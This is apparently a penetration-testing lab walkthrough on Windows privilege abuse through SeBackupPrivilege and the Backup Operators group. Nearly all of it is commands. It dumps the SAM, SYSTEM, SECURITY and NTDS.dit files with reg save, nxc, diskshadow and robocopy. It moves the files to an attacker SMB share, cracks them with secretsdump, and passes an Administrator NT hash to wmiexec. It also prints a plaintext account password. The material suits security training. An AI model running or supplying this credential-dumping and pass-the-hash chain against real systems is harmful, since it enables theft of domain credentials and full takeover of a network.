
If an user has the SeBackupPrivilege enabled or is part of the Backup Operators group we can retrieve the SYSTEM & SAM files from registry hives or even copy the whole drive and back it up into an different drive to access sensitive files like SYSTEM & SAM.
## Registry Hive PoC

```
reg save hklm\sam C:\Temp\SAM
```

```
reg save hklm\system C:\Temp\SYSTEM
```
##### Evil-WinRM

```
download SAM
```

```
download SYSTEM
```

##### Without Evil-WinRM

On local machine:

```
impacket-smbserver test . -smb2support  -username saitama -password saitama
```

On target machine:

```
net use m: \\192.168.45.241\test /user:saitama saitama
```

Downloaded SAM file on local machine.

```
copy SAM m:\
```

Downloaded SYSTEM file on local machine.

```
copy SYSTEM m:\
```

Utilize secretsdump to dump hashes.

```
/usr/share/doc/python3-impacket/examples/secretsdump.py -system SYSTEM -sam SAM local
```

Connected to Administrator with wmiexec.py

```
/usr/share/doc/python3-impacket/examples/wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f518eb35353d7a83d27e7fe457664e5 Administrator@192.168.238.222
```

---
## NXC Dumping

I decided to use an in-built utility of nxc to dump sam, system & security file remotely with backup operator.

```
nxc smb 192.168.210.16 -u melissa -p 'WinterIsHere2022!' -M backup_operator
```

This saved the SAM, SYSTEM & SECURITY File in the SYSVOL SMB Share. Navigated there and downloaded all of them.

```
smbclient \\\\192.168.210.16/SYSVOL -U melissa
mget SYSTEM
mget SAM
mget SECURITY
```

Dumped all local hashes.

```
impacket-secretsdump -system SYSTEM -sam SAM -security SECURITY local
```

---
# Getting Domain Hashes

I need to get Domain Hashes. I can only get them by getting access to the so called NTDS.dit file. Since this file is getting used by the AD itself all the time, it can't be extracted.  We need to create a so called "shadow copy". The extraction o the domain hashes also requires the SYSTEM hive, which I already retrieved.

This template creates an snapshot or shadow copy of the C:\ Drive and exports it into an E:\ Drive. We can then view the NTDS.dit file in there and download it onto our local machine.

Saved this content into an script.txt file on the local machine.

```
set verbose on  
set metadata C:\Windows\Temp\test.cab  
set context persistent  
add volume C: alias cdrive  
create  
expose %cdrive% E:
```

Since Linux uses LF line endings and windows uses CRLF. We'll need to modify the script with another command in order to eliminate any errors.

```
unix2dos script.txt
```

We can now upload the script to the target.

```
upload script.txt
```

I then ran the windows in-built utility diskshadow.exe which allows me to create an copy of the C:\ Drive.

```
diskshadow /s script.txt
```

We can confirm if it worked.

```
dir E:\
```

To copy the NTDS.dit file we will utilize the windows in-built tool called "robocopy", because it is saver for big files.

```
robocopy /b E:\Windows\ntds . ntds.dit
```

This ensures that the Active Directory Database File is in our current Drive & Directory.

I then downloaded the file to my local machine.

```
download ntds.dit
```

Extracting SYSTEM hive out of the registry.

```
reg save hklm\system C:\Temp\SYSTEM
```

Downloading the hive onto my local machin.

```
download SYSTEM
```

Utilized secretsdump.py in order to dump all domain hashes.

```
/usr/share/doc/python3-impacket/examples/secretsdump.py -system SYSTEM -ntds ntds.dit local
```
